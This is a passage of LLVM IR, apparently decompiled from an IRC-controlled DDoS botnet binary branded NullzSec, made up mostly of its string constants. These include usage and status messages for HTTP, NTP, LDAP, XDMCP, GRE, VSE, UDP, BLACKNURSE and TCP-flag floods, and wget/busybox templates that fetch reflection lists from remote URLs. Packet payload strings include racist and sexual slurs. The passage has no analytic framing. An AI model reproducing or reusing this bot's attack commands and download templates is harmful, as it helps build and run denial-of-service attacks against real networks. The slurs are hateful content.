i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029dbc.190, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029dc8.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029dd0.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029dd8.193, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029de0.194, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10029de8.195, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029df8.196, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029dbc.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e00.197, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e08.198, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e10.199, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029dc8.191, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e20.201, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029e28.202, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e30.203, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029dc8.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e38.204, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e40.205, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10029e4c.206, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029e5c.207, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10029e68.208, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e6c.209, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029e74.210, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029e7c.211, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e88.212, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e94.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029e9c.214, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ea4.215, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029eac.216, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029eb8.217, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029ec0.218, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ec8.219, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029ed0.220, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ed8.221, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029dbc.190, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ee4.222, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ef0.223, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ef8.224, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e10.199, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029f00.225, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029f0c.226, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029f18.227, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f20.228, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f28.229, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10029e68.208, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f30.230, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10029e4c.206, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f38.231, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e40.205, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e94.213, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f40.232, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e38.204, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029f48.233, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029f54.234, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10029f60.235, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e00.197, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ed8.221, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ef0.223, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f64.236, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ef8.224, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029ec0.218, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029f18.227, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ef8.224, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029dac.188, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ef0.223, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029dc8.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029db4.189, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ed8.221, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e00.197, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029ed0.220, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029f54.234, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029ec0.218, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029da4.187, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029de0.194, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029eac.216, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f40.232, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ea4.215, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f6c.237, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f38.231, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_10029e4c.206, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f30.230, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10029e68.208, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f28.229, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f20.228, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029dbc.190, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029f18.227, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029f0c.226, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029f00.225, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10029e40.205, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e38.204, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029dc8.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e30.203, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10029ed8.221, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029e08.198, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029f74.238, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10029e28.202, i32 0, i32 0), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* bitcast (i32* @global_var_10029e1c.200 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029e20.201, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029ef0.223, i32 0, i32 0), i8* bitcast (i32* @global_var_10029f7c.239 to i8*), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10029f80.240, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f84.241, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f8c.242, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029f94.243, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10029f9c.244, i32 0, i32 0)]
@global_var_1002a954.246 = constant [29 x i8] c"NOTICE %s :HTTP Flooding %s\0A\00"
@global_var_10004600.247 = constant i32 1207959760
@global_var_1002a974.248 = constant [181 x i8] c"wget -U \22%s\22 -q \22%s\22 -O /dev/null || busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /bin/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null || /usr/busybox wget -U \22%s\22 -q \22%s\22 -O /dev/null &\00"
@global_var_100046d0.249 = constant [3 x i8] c"8`\00"
@global_var_10004834.252 = constant [3 x i8] c"8`\00"
@global_var_10004970.253 = constant [3 x i8] c"8`\00"
@global_var_10004984.254 = constant [3 x i8] c"9 \00"
@global_var_1002aa38.255 = constant [112 x i8] c"NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_10004b18.256 = constant [3 x i8] c"8`\00"
@global_var_1002aaa8.257 = constant [171 x i8] c"wget \22%s\22 -q -O NTP.txt || busybox wget \22%s\22 -O NTP.txt || /bin/busybox wget \22%s\22 -O NTP.txt || /usr/busybox wget \22%s\22 -O NTP.txt || /var/run/busybox wget \22%s\22 -O NTP.txt\00"
@global_var_10004bc8.258 = constant [3 x i8] c"8`\00"
@global_var_10004bdc.259 = constant i32 939524096
@global_var_1002ab54.260 = constant [8 x i8] c"NTP.txt\00"
@global_var_1002ab5c.261 = constant [36 x i8] c"NOTICE %s :NTP amp attacking %s:%s\0A\00"
@global_var_10004fa4.262 = constant i32 939524096
@global_var_1002ab80.263 = constant i32 50531635
@global_var_10005130.264 = constant i32 939524132
@global_var_1002aba4.265 = constant [41 x i8] c"NOTICE %s :BLACKNURSE <target ip> <secs>\00"
@global_var_100051ac.266 = constant [3 x i8] c"8`\00"
@global_var_10005264.267 = constant [3 x i8] c"8`\00"
@global_var_1002abd0.268 = constant [7 x i8] c"socket\00"
@global_var_10005298.269 = constant [3 x i8] c"8`\00"
@global_var_1002abd8.270 = constant [28 x i8] c"NOTICE %s :Blacknursing %s\0A\00"
@global_var_1002abf4.271 = constant [7 x i8] c"sendto\00"
@global_var_100053a0.272 = constant i32 1207959632
@global_var_100053d8.273 = constant i32 939524096
@global_var_100451c8.274 = local_unnamed_addr global i32 0
@global_var_1004ed98.275 = global i32 0
@global_var_1002abfc.276 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_10005504.277 = constant [3 x i8] c"8`\00"
@global_var_1004dc70.278 = global i32 0
@global_var_10005570.279 = constant [3 x i8] c"8`\00"
@global_var_1004ed84.280 = global i32 0
@global_var_100055dc.281 = constant [3 x i8] c"8`\00"
@global_var_1004edac.282 = global i32 0
@global_var_10005648.283 = constant [3 x i8] c"8`\00"
@global_var_100059c0.284 = constant [3 x i8] c"8`\00"
@global_var_100059d4.285 = constant [3 x i8] c"9 \00"
@global_var_1002ac08.286 = constant [102 x i8] c"NOTICE %s :GRE <target IP> <port dest> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_1002ac70.287 = constant [29 x i8] c"NOTICE %s :GRE ATTACKING %s\0A\00"
@global_var_10005df4.288 = constant i32 939524096
@global_var_10005f28.289 = constant i32 939524096
@global_var_100062c0.296 = constant [3 x i8] c"8`\00"
@global_var_100062d4.297 = constant [3 x i8] c"9 \00"
@global_var_1002aca8.298 = constant [90 x i8] c"NOTICE %s :VSE <target IP> <number threads to use> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_1002ad04.299 = constant [29 x i8] c"NOTICE %s :VSE ATTACKING %s\0A\00"
@global_var_100065ec.300 = constant i32 939524096
@global_var_10006720.301 = constant i32 939524096
@global_var_1000696c.305 = constant [3 x i8] c"8`\00"
@global_var_10006a94.306 = constant [3 x i8] c"8`\00"
@global_var_10006aa8.307 = constant [3 x i8] c"9 \00"
@global_var_1002ad2c.308 = constant [114 x i8] c"NOTICE %s :XMDCP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_10006c3c.309 = constant [3 x i8] c"8`\00"
@global_var_10006c44.310 = constant [3 x i8] c"8`\00"
@global_var_1002ada0.311 = constant [166 x i8] c"wget \22%s\22 -q -O XM.txt || busybox wget \22%s\22 -O XM.txt || /bin/busybox wget \22%s\22 -O XM.txt || /usr/busybox wget \22%s\22 -O XM.txt || /var/run/busybox wget \22%s\22 -O XM.txt\00"
@global_var_10006d0c.312 = constant [3 x i8] c"8`\00"
@global_var_10006d20.313 = constant i32 939524096
@global_var_1002ae48.314 = constant [7 x i8] c"XM.txt\00"
@global_var_1002ae50.315 = constant [32 x i8] c"NOTICE %s :XDMCP ATTACKING: %s\0A\00"
@global_var_10007140.316 = constant i32 939524096
@global_var_10007274.317 = constant i32 939524096
@global_var_1002ae70.318 = constant i32 813957120
@global_var_1000740c.319 = constant [3 x i8] c"8`\00"
@global_var_100074c8.320 = constant [3 x i8] c"8`\00"
@global_var_100075f0.321 = constant [3 x i8] c"8`\00"
@global_var_10007604.322 = constant [3 x i8] c"9 \00"
@global_var_1002aea4.323 = constant [113 x i8] c"NOTICE %s :LDAP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_10007798.324 = constant [3 x i8] c"8`\00"
@global_var_100077a0.325 = constant [3 x i8] c"8`\00"
@global_var_1002af18.326 = constant [176 x i8] c"wget \22%s\22 -q -O LDAP.txt || busybox wget \22%s\22 -O LDAP.txt || /bin/busybox wget \22%s\22 -O LDAP.txt || /usr/busybox wget \22%s\22 -O LDAP.txt || /var/run/busybox wget \22%s\22 -O LDAP.txt\00"
@global_var_10007868.327 = constant [3 x i8] c"8`\00"
@global_var_1000787c.328 = constant i32 939524096
@global_var_1002afc8.329 = constant [9 x i8] c"LDAP.txt\00"
@global_var_1002afd4.330 = constant [31 x i8] c"NOTICE %s :LDAP ATTACKING: %s\0A\00"
@global_var_10007c9c.331 = constant i32 939524096
@global_var_10007dd0.332 = constant i32 939524096
@global_var_1002aff4.333 = constant [39 x i8] c"NOTICE %s :UDP <target> <port> <secs>\0A\00"
@global_var_10007ec0.334 = constant [3 x i8] c"8`\00"
@global_var_1002b01c.335 = constant [25 x i8] c"NOTICE %s :Packeting %s\0A\00"
@global_var_10008130.336 = constant i32 939524096
@global_var_1002b038.337 = constant i32 2
@global_var_100081a8.338 = constant i32 939524096
@global_var_1002b088.339 = constant [39 x i8] c"NOTICE %s :PAN <target> <port> <secs>\0A\00"
@global_var_1000822c.340 = constant [3 x i8] c"8`\00"
@global_var_10008234.341 = constant i32 939524096
@global_var_1002b0b0.342 = constant [23 x i8] c"NOTICE %s :Panning %s\0A\00"
@global_var_10008574.343 = constant [3 x i8] c"9?\00"
@global_var_10008618.344 = constant i32 939524096
@global_var_1002b144.345 = constant i32 2
@global_var_10008690.346 = constant i32 939524096
@global_var_1002b0c8.347 = constant i32 21
@global_var_100086c0.348 = constant i32 939524127
@global_var_1002b194.349 = constant [45 x i8] c"NOTICE %s :GIGATCP <target> <method> <secs>\0A\00"
@global_var_1000873c.350 = constant [3 x i8] c"8`\00"
@global_var_10008744.351 = constant i32 939524096
@global_var_1002b1c4.352 = constant [65 x i8] c"NOTICE %s :GIGA-TCP Flooding %s using the ' %s ' method Request\0A\00"
@global_var_10008808.353 = constant i32 939524098
@global_var_1002b208.354 = constant [4 x i8] c"all\00"
@global_var_1002b20c.355 = constant [5 x i8] c"xmas\00"
@global_var_1002b214.356 = constant [5 x i8] c"usyn\00"
@global_var_1002b21c.357 = constant [7 x i8] c"GigAck\00"
@global_var_1002b224.358 = constant [8 x i8] c"GigaSyn\00"
@global_var_1002b22c.359 = constant i32 738197504
@global_var_1002b230.360 = constant [4 x i8] c"syn\00"
@global_var_1002b234.361 = constant [4 x i8] c"rst\00"
@global_var_1002b238.362 = constant [4 x i8] c"fin\00"
@global_var_1002b23c.363 = constant [4 x i8] c"ack\00"
@global_var_1002b240.364 = constant [4 x i8] c"psh\00"
@global_var_1002b244.365 = constant [4 x i8] c"urg\00"
@global_var_10008d70.366 = constant [3 x i8] c"9?\00"
@global_var_10008e14.367 = constant i32 939524096
@global_var_10008e78.368 = constant i32 939524096
@global_var_1002b248.369 = constant [85 x i8] c"NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\0A\00"
@global_var_10008f88.370 = constant [3 x i8] c"8`\00"
@global_var_1002b2a0.371 = constant i32 805306368
@global_var_1002b2a4.372 = constant [7 x i8] c"random\00"
@global_var_1002b2ac.373 = constant [49 x i8] c"NOTICE %s :Unknowning %s:%s with packet size %s\0A\00"
@global_var_10009190.374 = constant i32 1207959592
@global_var_100091b8.375 = constant [3 x i8] c"8`\00"
@global_var_10009264.376 = constant [3 x i8] c"8`\00"
@global_var_1002b2e0.378 = constant [4 x i8] c"std\00"
@global_var_1002b2e4.379 = constant [4 x i8] c"dts\00"
@global_var_1002b2e8.380 = constant [4 x i8] c"lsk\00"
@global_var_1002b2ec.381 = constant [4 x i8] c"kek\00"
@global_var_1002b2f0.382 = constant [6 x i8] c"smack\00"
@global_var_1002b2f8.383 = constant [4 x i8] c"ily\00"
@global_var_1002b2fc.384 = constant [10 x i8] c"tfw no gf\00"
@global_var_1002b308.385 = constant [11 x i8] c"frienzoned\00"
@global_var_1002b314.386 = constant [4 x i8] c"tyf\00"
@global_var_1002b318.387 = constant [4 x i8] c"pos\00"
@global_var_1002b31c.388 = constant [6 x i8] c"cunts\00"
@global_var_1002b324.389 = constant [9 x i8] c"NullzSec\00"
@global_var_1002b330.390 = constant [13 x i8] c"NullzSec rox\00"
@global_var_1002b340.391 = constant [21 x i8] c"Sh4dow on your 4head\00"
@global_var_1002b358.392 = constant [10 x i8] c"get raped\00"
@global_var_1002b364.393 = constant [18 x i8] c"not a ddos packet\00"
@global_var_1002b378.394 = constant [23 x i8] c"also not a ddos packet\00"
@global_var_1002b390.395 = constant [28 x i8] c"seriously not a ddos packet\00"
@global_var_1002b3ac.396 = constant [38 x i8] c"GET / HTTP/1.1\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_1002b3d4.397 = constant [37 x i8] c"GET / HTTP/1.1\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_1002b3fc.398 = constant [38 x i8] c"GET / HTTP/1.0\0D\0AHost: goatse.info\0D\0A\0D\0A\00"
@global_var_1002b424.399 = constant [37 x i8] c"GET / HTTP/1.0\0D\0AHost: tubgirl.ca\0D\0A\0D\0A\00"
@global_var_1002b44c.400 = constant [16 x i8] c"8======D~~~~~~~\00"
@global_var_1002b45c.401 = constant [8 x i8] c"suck it\00"
@global_var_1002b464.402 = constant [10 x i8] c"give succ\00"
@global_var_1002b470.403 = constant [47 x i8] c"big nigger dick 8============================D\00"
@global_var_1002b4a0.404 = constant [18 x i8] c"( . Y . ) tiddies\00"
@global_var_1002b4b4.405 = constant [9 x i8] c"bigNullz\00"
@global_var_1002b4c0.406 = constant [13 x i8] c"eye pee rape\00"
@global_var_1002b4d0.407 = constant [21 x i8] c"eye pee address rape\00"
@global_var_1002b4e8.408 = constant [8 x i8] c"IP rape\00"
@global_var_1002b4f0.409 = constant [13 x i8] c"This is LOIC\00"
@global_var_1002b500.410 = constant [5 x i8] c"LOIC\00"
@global_var_1002b508.411 = constant [5 x i8] c"HOIC\00"
@global_var_1002b510.412 = constant [5 x i8] c"XOIC\00"
@global_var_1002b518.413 = constant [7 x i8] c"LHXOIC\00"
@global_var_1002b520.414 = constant [33 x i8] c"A cat is fine too. Desudesudesu~\00"
@global_var_1002b544.415 = constant [18 x i8] c"the biiiiig pussy\00"
@global_var_1002b558.416 = constant [6 x i8] c"benis\00"
@global_var_1002b560.417 = constant [6 x i8] c"penis\00"
@global_var_1002b568.418 = constant [5 x i8] c"dick\00"
@global_var_1002b570.419 = constant [7 x i8] c"vagina\00"
@global_var_1002b578.420 = constant [9 x i8] c"clitoris\00"
@global_var_1002b584.421 = constant [6 x i8] c"pussy\00"
@global_var_1002b58c.422 = constant [4 x i8] c"tfw\00"
@global_var_1002b590.423 = constant [4 x i8] c":^}\00"
@global_var_1002b594.424 = constant [9 x i8] c"dic pic?\00"
@global_var_1002b5a0.425 = constant [11 x i8] c"send nudes\00"
@global_var_1002b5ac.426 = constant [29 x i8] c"https://youtu.be/dQw4w9WgXcQ\00"
@global_var_1002b5cc.427 = constant [24 x i8] c"Never gonna give you up\00"
@global_var_1002b5e4.428 = constant [25 x i8] c"Never gonna make you cry\00"
